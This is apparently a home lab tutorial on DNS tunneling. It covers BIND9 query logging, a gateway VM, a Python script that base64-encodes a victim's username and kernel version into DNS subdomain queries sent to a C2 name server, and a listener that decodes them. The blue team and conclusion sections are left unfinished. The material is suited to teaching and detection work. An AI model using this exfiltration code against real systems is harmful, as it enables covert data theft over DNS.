---
title: DNS Tunneling
date: 2025-06-11
draft: false
author: Alex Jenkins
---
| Category      | ID        | Description       |
| ------------- | --------- | ----------------- |
| Tactic        | TA0011     | Command and Control |
| Techniques     | T1071, T1132     | Application Layer Protocol, Data Encoding  |
| Sub-Techniques | T1071.004, T1132.001 | DNS, Standard Encoding |

<!--more-->

## Introduction
The Domain Name System (DNS) is a common Application Layer protocol that communicates over port 53. Many organisations will allow traffic over this protocol because it is essential for translating domain names into IP addresses. Adversaries may use this to their advantage and communicate with their Command and Control (C2) servers over this commonly-used protocol, blending in with normal traffic.  

In today's lab I will be demonstrating my own take on this issue, showcasing one way in which an adversary may exfiltrate data using DNS queries. It walks through the configuration of an infected machine, DNS server, firewall, and includes scripts that demonstrate how adversaries might extract, encode and transmit data. The lab concludes with a blue team investigation into detection and remediation strategies.

Though the main technique explored in this lab is `T1081.004`, there is a slight crossover with `T1132.001`. This is because domain queries made over the DNS protocol can fail if any obscure characters exist, therefore all exfiltrated data from the infected machine is encoded with base64 first. This isn't a direct demonstration of the technique itself, but rather a necessary caveat of my chosen extraction method. In this case, the infected machine refers to the system hosting malware, which extracts system information and exfiltrates it to a malicious DNS server.

## Configuration
For this configuration I am using Ubuntu Server 24.04.2 LTS for the C2 server and gateway, and Arch Linux for the infected machine. You don't need to use Arch for your infected machine, you can use whatever Linux distribution you're comfortable with. I recommend Ubuntu Server for the C2 server because it offers easy-to-install DNS software from the package repository, and is very beginner friendly.

During this configuration I will expect you to have some experience working with Virtual Machines (VMs). This is important because I will not be going into specifics of how to configure the VM. You will be responsible for managing your own virtual hardware and resource allocation.

My servers and hosts are setup as VMs using VirtualBox. I've decided on this purely because it works well on Linux, and because it's software that I'm familiar with. Use whatever virtualization technology you're comfortable with to setup your three VMs, then continue reading to configure the DNS.

### C2 Server
First of all, make sure you download `bind9` and `dnsutils`. `bind9` is what we will be using as the name server, and `dnsutils` gives us some common DNS troubleshooting tools like `nslookup`. Install these with the following command:
```
sudo apt-get install bind9 dnsutils
```

I will be covering all the steps required to get this up and running, but I would encourage you to read [Ubuntu's Tutorial](https://documentation.ubuntu.com/server/how-to/networking/install-dns/index.html) on setting up a DNS server because it's much more comprehensive than mine. It's also a very good place to start if you're a beginner and have never setup a DNS server before.

To setup the forward lookup zone you need to modify `/etc/bind/named.conf.local`. You'll change this to use whatever FQDN you want, I've gone with the very creative `homelab.local`, then list it as type _master_ and point it to your new file. This tells the DNS where to look for your forward zone configurations.
```
zone "homelab.local" {
  type master;
  file "/etc/bind/db.homelab.local";
};
```

The next logical step should then be to make the forward zone file. To do that just copy an existing zone file as a template for editing, matching the file path you used in `named.conf.local`.
```
sudo cp /etc/bind/db.local /etc/bind/db.homelab.local
```

Now you want to open that file in a text editor and make some changes. You can copy my file, just make sure you change it to reflect the correct domain and IP address for your nameserver.  
> Important: The serial number needs to be incremented any time you make a change to this file.
```
;
; BIND data file for local loopback interface
;
$TTL    604800
@       IN      SOA     homelab.local. root.homelab.local. (
                              2         ; Serial
                         604800         ; Refresh
                          86400         ; Retry
                        2419200         ; Expire
                         604800 )       ; Negative Cache TTL
;
@       IN      NS      homelab.local.
@       IN      A       192.168.1.155      
```

That's all you need to do to make a working DNS, but we need to go one step further and enable logging. Enabling logs will allow us to capture queries from the infected machine and save them for processing. This file doesn't have any system-specific content so feel free to just copy and paste it if you want. Pop these changes into `/etc/bind/named.conf`:
```
include "/etc/bind/named.conf.options";
include "/etc/bind/named.conf.local";
include "/etc/bind/named.conf.default-zones";

logging {
        channel query.log {
                file "/var/log/named/query.log";
        };
        category queries { query.log; };
};
```

Now, let's finish setting up the logging system and restart services to apply changes. Run these commands to make the new directory for the logs to live in, change the ownership to bind (the user which the _named daemon_ runs as), restart the service to apply any changes, and start listening for logs.
```
sudo mkdir /var/log/named
sudo chown bind:bind /var/log/named
sudo systemctl restart bind9
sudo tail -f /var/log/named/query.log
```

On a separate machine, use the `nslookup` tool from the `dnsutils` suite to query your newly configured domain and verify functionality. Feel free to use the infected machine for this, just make sure it's configured to use your new DNS (see the next section to learn how to do this). There's a snippet of both the command I used and the output below. If you've followed the steps correctly you will see the domain name and its resolved IP address.

```
[alex@extarch c2-projects]$ nslookup homelab.local
Server:		192.168.1.155
Address:	192.168.1.155#53

Name:	homelab.local
Address: 192.168.1.155
```

This command serves two purposes: 

1. Verify that the domain resolves correctly
2. Create a log entry on the server

The server, still running `tail -f /var/log/named/query.log`, will print a log entry for that query that should look similar to the following snippet:
```
client @0x77042c1ca578 192.168.1.182#36083 (homelab.local): query: homelab.local IN A + (192.168.1.155)
```

### Firewall
Configure two network adapters - one host-only and one NAT. The host-only should be shared with the infected machine and the NAT will allow you to communicate with wider internet and the rest of the network, essentially acting as a gateway to the internet for the infected machine.

To configure the firewall you need to have two Network Interface Cards (NICs). One will link exclusively with the infected machine, and the other will allow the firewall to freely communicate with the internet and internal network. To do this you'll typically need to setup a Host-Only adapter and a Network Address Translation (NAT) adapter. Or in my case, a bridged adapter because I'm using a Wi-Fi adapter. In any case you'll need to make some configurations on both machines to enable communication between the two machines. If you make the first NIC your normal adapter (i.e. one that can reach the internet without any effort) you should only need to configure the Host-Only link.

To begin, type `ip addr` into your terminal to see your network devices. You should see two NICs, one of which will be down like in the example below:
```
3: enp0s8: <BROADCAST,MULTICAST> mtu 1500 qdisc fq_codel state DOWN group default qlen 1000
    link/ether 08:00:27:7d:98:82 brd ff:ff:ff:ff:ff:ff
```

This is the NIC we'll be using for our Host-Only network. Bring up this interface.
```
sudo ip link set enp0s up
```

After you've run that command you should see that it's state has changed. Run `ip addr` again to verify that.
```
3: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:7d:98:82 brd ff:ff:ff:ff:ff:ff
    inet6 fe80::a00:27ff:fe7d:9882/64 scope link 
       valid_lft forever preferred_lft forever
```

Edit your network config file. In Ubuntu it will be in `/etc/netplan/` by default. Mine is `/etc/netplan/50-cloud-init.yaml` for example. When you do this you'll need to make a new entry for your network adapter that you just brought up. Make sure the address you use here aligns with what's configured in your host-only adapter in your VM software settings.
```
network:
  version: 2
  ethernets:
    enp0s3:
      dhcp4: true
    enp0s8:
      addresses:
        - 192.168.56.10/24
```
When that's done run
```
sudo netplan apply
ip addr
```

And you should see that your adapter now has the IP address you assigned.
```
3: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:7d:98:82 brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.10/24 brd 192.168.56.255 scope global enp0s8
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:fe7d:9882/64 scope link 
       valid_lft forever preferred_lft forever
```

Then you need to configure traffic forwarding:
```
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A POSTROUTING -o enp0s3 -j MASQUERADE
sudo iptables -A FORWARD -i enp0s8 -o enp0s3 -j ACCEPT
sudo iptables -A FORWARD -i enp0s3 -o enp0s8 -m state --state RELATED, ESTABLISHED -j ACCEPT
```

You'll also need to modify `/etc/resolv.conf`. Doing this simulates real-world DNS connection by adding the C2 server to the list of recognised nameservers. In other words; you'll be allowing the infected machine to treat your server as its own DNS, enabling IP resolution whilst keeping it isolated to your private network. In real-world scenarios this wouldn't be required because the domain would be internet facing and resolved by a public DNS provider.
```
nameserver 192.168.1.155 # Change this to the IP of your DNS server
```

Everything done on the firewall machine up until this point has enabled two-way communication with the infected machine, and established the C2 server as a recognised DNS resolver. The next steps will show some actual firewall cofigurations, which should help to understand the mechanics of DNS tunneling, and setup a sensor to monitor and detect suspicious network activity.

- firewall
- zeek
- wazuh integration

### Infected Machine

The infected machine doesn't need much in terms of configuration. Out of the box though this won't work, we'll need to connect it to the Host-Only network and route traffic through the firewall or it won't be able to reach the internet. Figure out what your network card's name is using `ip addr` then do the following:
```
sudo ip link set enp0s3 up
sudo ip addr add 192.168.56.11/24 dev enp0s3
sudo ip route add default via 192.168.56.10
```

Make sure you change the name of the network interface and the IP addresses in those commands to fit your requirements. By running those three commands you've effectively activated the NIC, assigned an IP address to it, and told it to route traffic through the firewall.

## Red Team
With configuration finished the red team engagement can commence. For this part we assume that the adversary has already managed to get malware onto the victim's machine, and it is now infected. This malware was created specifically for this lab, is written in Python, and is provided in the next code block.

I've named this malware `dns_tunneling.py` and its sole purpose is to extract information from the infected machine and exfiltrate it over DNS to the C2 server. That might sound complicated, but it's quite easy when you break it down into steps:

1. Collect the data using built-in linux commands via `subprocess`
2. Encode it with base64 for seamless transportation
3. Clean the data and strip unnecessary characters
4. Query the C2 DNS server with the encoded data

Encoding with base64 is required because DNS operates with a strict set of character limitations. This means that certain special characters like spaces, slashes and non-ASCII symbols could break the query entirely. When you encode this data with base64 you're essentially sanitizing the data so that it doesn't interfere with the query's structure.

Please note the DNS toolkit used in this malware is not installed by default. `subprocess` and `base64` will be included with a typical Python install but you will need to install `dnspython` to get the exfiltration section to work. You can do this by running `pip install dnspython`. Note that this likely won't work and you'll have to use your chosen distribution's package manager to install this, or setup a virtual environment with Python. I went with the package option and ran `sudo pacman -S python-dnspython`.

``` python
def base64_encode(data):
    # base64 encoding requires input data as bytes
    if not isinstance(data, bytes):
       data = data.encode("utf-8")
    data = base64.b64encode(data)
    return data.decode("utf-8").strip()

def run_command(commands):
    # process commands and return stdout as bytes
    return subprocess.run(commands, capture_output=True).stdout

# Extract
import subprocess
raw_username = run_command("whoami")
raw_system_info = run_command(["uname", "-r"])

# Encode
import base64
encoded_username = base64_encode(raw_username)
encoded_system_info = base64_encode(raw_system_info)

# Exfiltrate
import dns.resolver
domain = ".homelab.local" # change this to suit your needs
encoded_message = f"{encoded_username}.{encoded_system_info}" + domain
try:
    dns.resolver.resolve(encoded_message, 'TXT')
except:
    # pass to ignore errors when resolving domains
    # -- errors will occur because the domains are non-existent
    pass
```

When the script above is run your C2 server should receive a log that looks similar to this:
```
client @0x77042c1ca578 192.168.1.182#55499 (YWxleAo=.Ni4xNC4xMC1hcmNoMS0xCg==.homelab.local): query: YWxleAo=.Ni4xNC4xMC1hcmNoMS0xCg==.homelab.local IN TXT +E(0) (192.168.1.155)
```

Notice how the query contains two obfuscated strings; `YWxleAo=` and `Ni4xNC4xMC1hcmNoMS0xCg==`. What we've done here is queried `homelab.local` but included the exfiltrated and encoded data as two additional subdomains. In doing this the C2 server has managed to log the query despite the fact that the domain does not exist. This is exactly how we will harness this exfiltration technique - we just need to make a listener that can decode the logs for us.

``` python
import re
import time
import base64

dns_log_file = "/var/log/named/query.log"

with open(dns_log_file, "r") as file:
    file.seek(0,2) # move to end of file
    while True:
        message = []
        line = file.readline()
        if line:
            line = line.strip()
            match = re.search(r'query: ([^\s]+)', line)
            if match:
                query = match.group(1)
                split_query = query.split('.')
                for section in split_query:
                    if section == "homelab" or section == "local":
                        pass
                    else:
                        decoded_section = base64.b64decode(section).decode("utf-8").strip()
                        message.append(decoded_section)
        if message:
            print(" ".join(message))
        time.sleep(1)
```

`dns_listener.py` is designed to listen to the DNS log file for any updates, refreshing every second. You may have noticed that this is a very basic example and isn't very fault-tolerant. It will quickly strip out the query within the DNS record, split that query into sections by periods, and decode those sections if they don't match one of two keywords; homelab and local. Make sure to adapt those keywords to fit your setup if you're following along or you will have errors. A more robust approach would be to verify whether each section is actually base64-encoded rather than excluding specific keywords. However, this works perfectly fine for this lab exercise.

It's important to note that the malware on your infected machine will gather user and system information which will be different from mine. In other words, my example output will look much different to yours because you will have chosen your own username and operating system. That said, if all steps were followed correctly, the listener will have successfully decoded the DNS query and output the infected machine's details in plaintext:
```
alex@c2-server:~$ python3 dns_listener.py 
alex 6.14.10-arch1-1
```

With that you've had a basic example of how an adversary might exfiltrate data via the DNS protocol. The example I've given is the first step of communication, where the server has now received information which it can use to identify the infected machine. In future communications the infected machine could prefix messages with this information so that the C2 server may recognise the source of the data.

## Blue Team

`tshark`
```
   25 3.127105183 192.168.1.182 → 8.8.8.8      DNS 118 Standard query 0xe83a TXT YWxleAo=.Ni4xNC4xMC1hcmNoMS0xCg==.homelab.local OPT
   26 3.137087890      8.8.8.8 → 192.168.1.182 DNS 193 Standard query response 0xe83a No such name TXT YWxleAo=.Ni4xNC4xMC1hcmNoMS0xCg==.homelab.local SOA a.root-servers.net OPT
```

# Conclusion
